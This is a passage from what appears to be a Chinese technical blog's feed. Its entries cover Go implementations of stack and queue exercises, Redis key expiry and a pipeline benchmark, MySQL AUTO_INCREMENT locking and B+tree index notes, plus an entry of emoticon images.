        <content type="html"><![CDATA[<h3 id="用两个队列实现栈，并分析相关栈操作的运行时间。"><a href="#用两个队列实现栈，并分析相关栈操作的运行时间。" class="headerlink" title="用两个队列实现栈，并分析相关栈操作的运行时间。"></a>用两个队列实现栈，并分析相关栈操作的运行时间。</h3><p>思路同：<a href="https://liyuxing.blog.csdn.net/article/details/111464812">两个栈实现队列</a></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> DequeStack <span class="keyword">struct</span> {</span><br><span class="line">pushDeque *Deque</span><br><span class="line">popDeque *Deque</span><br><span class="line">flag <span class="type">bool</span> <span class="comment">// true in push, false in pop</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *DequeStack)</span></span> exchange(from, to *Deque) {</span><br><span class="line">to.Clean()</span><br><span class="line"><span class="keyword">for</span> <span class="literal">true</span> {</span><br><span class="line"><span class="keyword">if</span> v, ok := from.Pop(); ok {</span><br><span class="line">to.Push(v)</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">d.flag=!d.flag</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *DequeStack)</span></span> Push(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> !d.flag{</span><br><span class="line">d.exchange(d.popDeque, d.pushDeque)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> d.pushDeque.Push(val)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *DequeStack)</span></span> Pop() (<span class="type">int</span>, <span class="type">bool</span>){</span><br><span class="line"><span class="keyword">if</span> d.flag{</span><br><span class="line">d.exchange(d.pushDeque, d.popDeque)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> d.popDeque.Pop()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列实现</span></span><br><span class="line"><span class="keyword">type</span> Deque <span class="keyword">struct</span> {</span><br><span class="line">arr  [maxSize]<span class="type">int</span></span><br><span class="line">head <span class="type">int</span></span><br><span class="line">tail <span class="type">int</span></span><br><span class="line">size <span class="type">int</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> next(position <span class="type">int</span>) <span class="type">int</span> {</span><br><span class="line"><span class="keyword">if</span> position == <span class="built_in">len</span>(d.arr)<span class="number">-1</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> position + <span class="number">1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> isFull() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">return</span> d.size == <span class="built_in">len</span>(d.arr)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> isEmpty() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">return</span> d.size == <span class="number">0</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> Push(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> d.isFull() {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">d.arr[d.tail] = val</span><br><span class="line">d.tail = d.next(d.tail)</span><br><span class="line">d.size++</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> Pop() (<span class="type">int</span>, <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">val := d.arr[d.head]</span><br><span class="line">d.head = d.next(d.head)</span><br><span class="line">d.size--</span><br><span class="line"><span class="keyword">return</span> val, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> Clean() {</span><br><span class="line">d.head = <span class="number">0</span></span><br><span class="line">d.tail = <span class="number">0</span></span><br><span class="line">d.size = <span class="number">0</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论—一个数组中实现两个栈</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E6%A0%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h3 id="如何在一个数组A-1-n-中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。"><a href="#如何在一个数组A-1-n-中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。" class="headerlink" title="如何在一个数组A[1..n]中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。"></a>如何在一个数组A[1..n]中实现两个栈，使得当两个栈的元素个数之和不为n时，两者都不会发生上溢。</h3><ul><li>要求push和pop操作的运行时间为O(1)。</li></ul><h5 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h5><ul><li>两个栈分别从数组的两端开始，向中间push元素，直到两个指针相遇。<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> maxSize = <span class="number">10</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">sLeft stackType = <span class="literal">iota</span></span><br><span class="line">sRight</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> stackType <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Stack <span class="keyword">struct</span> {</span><br><span class="line">arr   [maxSize]<span class="type">int</span></span><br><span class="line">left  <span class="type">int</span></span><br><span class="line">right <span class="type">int</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stack = Stack{</span><br><span class="line">arr:   [maxSize]<span class="type">int</span>{},</span><br><span class="line">left:  <span class="number">-1</span>,</span><br><span class="line">right: maxSize,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> Push(val <span class="type">int</span>, stackType stackType) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.IsFull() {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> stackType == sLeft {</span><br><span class="line">s.arr[s.left+<span class="number">1</span>] = val</span><br><span class="line">s.left++</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">s.arr[s.right<span class="number">-1</span>] = val</span><br><span class="line">s.right--</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> Pop(stackType stackType) (val <span class="type">int</span>, exist <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> stackType == sLeft {</span><br><span class="line"><span class="keyword">if</span> s.left &gt; <span class="number">-1</span> {</span><br><span class="line">val = s.arr[s.left]</span><br><span class="line">exist = <span class="literal">true</span></span><br><span class="line">s.left--</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="keyword">if</span> s.right &lt; maxSize {</span><br><span class="line">val = s.arr[s.right]</span><br><span class="line">exist = <span class="literal">true</span></span><br><span class="line">s.right++</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两栈都为空</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> IsEmpty() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.right == maxSize &amp;&amp; s.left == <span class="number">-1</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> IsFull() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.right-s.left == <span class="number">1</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-exists有可能超出你的预期</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Redis-exists%E6%9C%89%E5%8F%AF%E8%83%BD%E8%B6%85%E5%87%BA%E4%BD%A0%E7%9A%84%E9%A2%84%E6%9C%9F/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Redis-exists%E6%9C%89%E5%8F%AF%E8%83%BD%E8%B6%85%E5%87%BA%E4%BD%A0%E7%9A%84%E9%A2%84%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="Redis的Exists有可能超出你的预期"><a href="#Redis的Exists有可能超出你的预期" class="headerlink" title="Redis的Exists有可能超出你的预期"></a>Redis的Exists有可能超出你的预期</h4><ul><li>理论上每个key都应该有过期时间（当然也可以是一万年），通常情况下用exists来判断一个key是否存在都没什么问题（一般过期时间都比较长）。但如果过期时间需要精确到秒或十秒及，那么exists就会出乎你的意料。</li></ul><h4 id="Redis过期键删除策略"><a href="#Redis过期键删除策略" class="headerlink" title="Redis过期键删除策略"></a>Redis过期键删除策略</h4><ul><li>Redis key过期的方式有三种：</li></ul><ol><li>被动删除：当读/写一个已经过期的key时，会触发惰性删除策略，直接删除掉这个过期key<blockquote><p>对这个key执行exists不会触发惰性删除</p></blockquote></li><li>主动删除：由于惰性删除策略无法保证冷数据被及时删掉，所以Redis会定期主动淘汰一批已过期的key</li><li>当前已用内存超过maxmemory限定时，触发主动清理策略<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_chatroom_user_tips</span>(<span class="params">self, uid</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.chatroom_redis.exists(<span class="string">"flag_key"</span>):</span><br><span class="line">        value = self.redis.get(<span class="string">"key"</span>, <span class="number">0</span> , <span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 间隔时间</span></span><br><span class="line">        _interval = <span class="number">30</span></span><br><span class="line">        <span class="keyword">if</span> group_ids:</span><br><span class="line">            self.redis.setex(<span class="string">"flag_key"</span>, value=<span class="number">1</span>, time=_interval)</span><br><span class="line">            self.redis.delete(<span class="string">"key"</span>)</span><br><span class="line">        <span class="keyword">return</span> group_ids</span><br></pre></td></tr></tbody></table></figure></li></ol><h6 id="上面代码存在的问题及应对方式"><a href="#上面代码存在的问题及应对方式" class="headerlink" title="上面代码存在的问题及应对方式"></a>上面代码存在的问题及应对方式</h6><p>问题</p><ul><li>redis Key在30s之后过期，但是执行exists命令的返回值可能还为True。</li><li>但是如果执行ttl命令是发现返回值为0。</li></ul><p>解决</p><ul><li>用ttl代替exists<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_chatroom_user_tips</span>(<span class="params">self, uid</span>):</span><br><span class="line">    <span class="keyword">if</span> self.chatroom_redis.ttl(<span class="string">"flag_key"</span>) &lt;= <span class="number">0</span>:</span><br><span class="line">        value = self.redis.get(<span class="string">"key"</span>, <span class="number">0</span> , <span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 间隔时间</span></span><br><span class="line">        _interval = <span class="number">30</span></span><br><span class="line">        <span class="keyword">if</span> group_ids:</span><br><span class="line">            self.redis.setex(<span class="string">"flag_key"</span>, value=<span class="number">1</span>, time=_interval)</span><br><span class="line">            self.redis.delete(<span class="string">"key"</span>)</span><br><span class="line">        <span class="keyword">return</span> group_ids</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-自增列AUTO_INCREMENT</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%87%AA%E5%A2%9E%E5%88%97AUTO-INCREMENT/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%87%AA%E5%A2%9E%E5%88%97AUTO-INCREMENT/</url>
      
        <content type="html"><![CDATA[<h3 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h3><h6 id="两种情况"><a href="#两种情况" class="headerlink" title="两种情况"></a>两种情况</h6><p>1、在载入语句执行前，已经<strong>不确定</strong>要插入多少条记录。</p><ul><li>在执行插入语句时在==表级别==加一个==auto-inc锁==，然后为每条待插入记录的auto-increment修饰的列分配递增的值，语句执行结束后，再把auto-inc锁释放掉。一个事务再持有auto-inc锁的过程中，其他事务的插入语句都要被阻塞，可以保证一个语句中分配的递增值是连续的。<blockquote><p>AUTO-INC锁的作用范围只是单个插入语句，插入语句执行完成后，这个锁就被释放了，跟我们之前介绍的锁在事务结束时释放是不一样的。</p></blockquote></li></ul><p>2、插入语句执行前就<strong>确定</strong>要插入多少条记录。</p><ul><li>采用一个轻量级的锁，在为插入语句生成auto-increment修饰的列的值时获取一下这个轻量级锁，生成需要用到的auto-increment列的值后，==立马释放==，不需要等语句执行。<blockquote><p>InnoDB中提供系统变量 innodb_autoinc_lock_mode 控制用以上哪种方式进行自增的赋值。</p><ol><li>innodb_autoinc_lock_mode=0 一律采用auto-inc锁。</li><li>innodb_autoinc_lock_mode=2 一律采用轻量级锁。</li><li>innodb_autoinc_lock_mode=1 混着来，插入记录数量确定时采用轻量级锁，不确定时使用AUTO-INC锁。</li></ol><p>当一律采用轻量级锁时，可能会造成不同事物中插入语句生成的值时交叉的，在有主从复制的场景中是不安全的。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-两次redis操作用不用pipeline</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-%E4%B8%A4%E6%AC%A1redis%E6%93%8D%E4%BD%9C%E7%94%A8%E4%B8%8D%E7%94%A8pipeline/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-%E4%B8%A4%E6%AC%A1redis%E6%93%8D%E4%BD%9C%E7%94%A8%E4%B8%8D%E7%94%A8pipeline/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么需要-pipeline-？"><a href="#为什么需要-pipeline-？" class="headerlink" title="为什么需要 pipeline ？"></a>为什么需要 pipeline ？</h4><ul><li>正常情况下，客户端发送一个命令，等待 Redis 应答；Redis 接收到命令，处理后应答。请求发出到响应的时间叫做往返时间，即 RTT（Round Time Trip）。在这种情况下，如果需要执行大量的命令，就需要等待上一条命令应答后再执行。这中间不仅仅多了许多次 RTT，而且还频繁的调用系统 IO，发送网络请求。</li><li>pipeline 允许客户端可以一次发送多条命令，而不等待上一条命令执行的结果。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVlY5MTY?x-oss-process=image/format,png" alt="在这里插入图片描述"></li></ul><h4 id="两次redis操作，用pipeline会不会好一点"><a href="#两次redis操作，用pipeline会不会好一点" class="headerlink" title="两次redis操作，用pipeline会不会好一点"></a>两次redis操作，用pipeline会不会好一点</h4><ul><li>执行10万次set<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    my_redis = redis.StrictRedis(connection_pool=redis.ConnectionPool.from_url(<span class="string">"redis://:@127.0.0.1/0"</span>), socket_timeout=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 不用pipeline</span></span><br><span class="line">    start_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">        key1 = <span class="string">"test1_%s"</span> % i</span><br><span class="line">        my_redis.<span class="built_in">set</span>(key1, i)</span><br><span class="line">        my_redis.expire(key1, <span class="number">3600</span>)</span><br><span class="line">    end_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    <span class="built_in">print</span> end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pipeline</span></span><br><span class="line">    start_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    pipe = my_redis.pipeline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">        key1 = <span class="string">"test2_%s"</span> % i</span><br><span class="line">        pipe.<span class="built_in">set</span>(key1, i)</span><br><span class="line">        pipe.expire(key1, <span class="number">3600</span>)</span><br><span class="line">    pipe.execute()</span><br><span class="line">    end_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    <span class="built_in">print</span> end_time - start_time</span><br></pre></td></tr></tbody></table></figure></li><li>执行结果<blockquote><p>16651、14477、15041 # 不用pipeline<br>4517、4158、4325  # 使用pipeline</p></blockquote></li><li>初步结论<blockquote><p>即使只有两次redis操作，pipeline的效果也很突出。</p></blockquote></li></ul><h4 id="两次已经表现优异了，次数多点怎么样？"><a href="#两次已经表现优异了，次数多点怎么样？" class="headerlink" title="两次已经表现优异了，次数多点怎么样？"></a>两次已经表现优异了，次数多点怎么样？</h4><ul><li><p>执行100万次sadd 操作</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">start_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        key1 = <span class="string">"test1_%s_%s"</span> % (i,j)</span><br><span class="line">        my_redis.sadd(key1, i)</span><br><span class="line">    my_redis.expire(key1, <span class="number">3600</span>)</span><br><span class="line">end_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span> end_time - start_time</span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">pipe = my_redis.pipeline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        key1 = <span class="string">"test2_%s_%s"</span> % (i,j)</span><br><span class="line">        pipe.sadd(key1, i)</span><br><span class="line">    pipe.expire(key1, <span class="number">3600</span>)</span><br><span class="line">pipe.execute()</span><br><span class="line">end_time = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span> end_time - start_time</span><br></pre></td></tr></tbody></table></figure></li><li><p>执行结果</p><blockquote><p>83849<br>26313</p></blockquote></li><li><p>初步结论</p><blockquote><p>pipeline居家必备</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emotions</title>
      <link href="/uncatesgorized/2021-07-16-Emoticons/"/>
      <url>/uncatesgorized/2021-07-16-Emoticons/</url>
      
        <content type="html"><![CDATA[<p>图片</p><ul><li>黑人问号</li></ul><p><img src="https://i.loli.net/2021/07/16/zLr4R9OBxoVdsGw.jpg" alt="e18d20c94006dfe0-9eef65073f0f6be0-d9c854df534cf3bd0dca74a7e620249c.jpeg"></p><ul><li>原来如此</li></ul><p><img src="https://i.loli.net/2021/07/16/q5s324OFgVGv6wz.jpg" alt="0c1c538af9ca1f83.jpg"></p><p><img src="https://i.loli.net/2021/07/16/GSqV1EBar9mKODA.jpg" alt="c027e07480e9f367.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-索引与算法</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="B-树索引的管理"><a href="#B-树索引的管理" class="headerlink" title="B+树索引的管理"></a>B+树索引的管理</h3><ul><li><p>创建索引</p><p>对于索引的添加或删除，MySQL先创建一张临时表，把数据导入临时表，删除原表，然后把临时表重命名为原来的表。因此大表创建和删除索引的时间非常长。</p><p>快速索引创建法：对于非聚集索引的创建，InnoDB会对表加S锁，创建过程中只能读，不能写。</p></li></ul><h3 id="B-树索引的使用"><a href="#B-树索引的使用" class="headerlink" title="B+树索引的使用"></a>B+树索引的使用</h3><ul><li><p>顺序读</p><p>顺序的读取磁盘上的块</p></li><li><p>随机读</p><p>访问的块不连续，需要磁头不断移动</p></li><li><p>预读取</p><p>通过一次I/O请求多个页预读到缓冲池中，并且估计预读的多个页马上会被访问。传统I/O请求每次只读取一个页，在传统机械硬盘较低的IOPS下，预读计数可以大大提高读取的性能。</p><blockquote><ol><li><p>随机预读</p><p>当一个区中==13==个页在缓冲区中，并在LRU列表的前端，则InnoDB存储引擎会将这个区中剩余的所有页都预读到缓冲区。</p><p>InnoDB Plugin 1.0.4开始，随机预读被取消。</p></li><li><p>线性预读</p><p>基于缓冲池中页的访问模式，而不是数量。如果一个区中的N个页都被顺序的访问了，则InnoDB会读取下一个区的所有页。</p><p>N的值由<code>innodb_read_ahead_threshold</code>控制，默认值56。</p></li></ol></blockquote></li></ul><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><ul><li><p>InnoDB中的哈希算法</p><p>InnoDB使用哈希算法对字典进行查找，采用链表方式解决冲突、哈希函数采用除法散列方式（ ==h(k)=k mod m== ）。</p><p>缓冲池中的Page页都有一个chain指针，指向相同哈希函数值的页。</p><p>除法散列，m的取值为略大于2倍的缓冲池页数量的质素。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-碎片整理遇到的那些事</title>
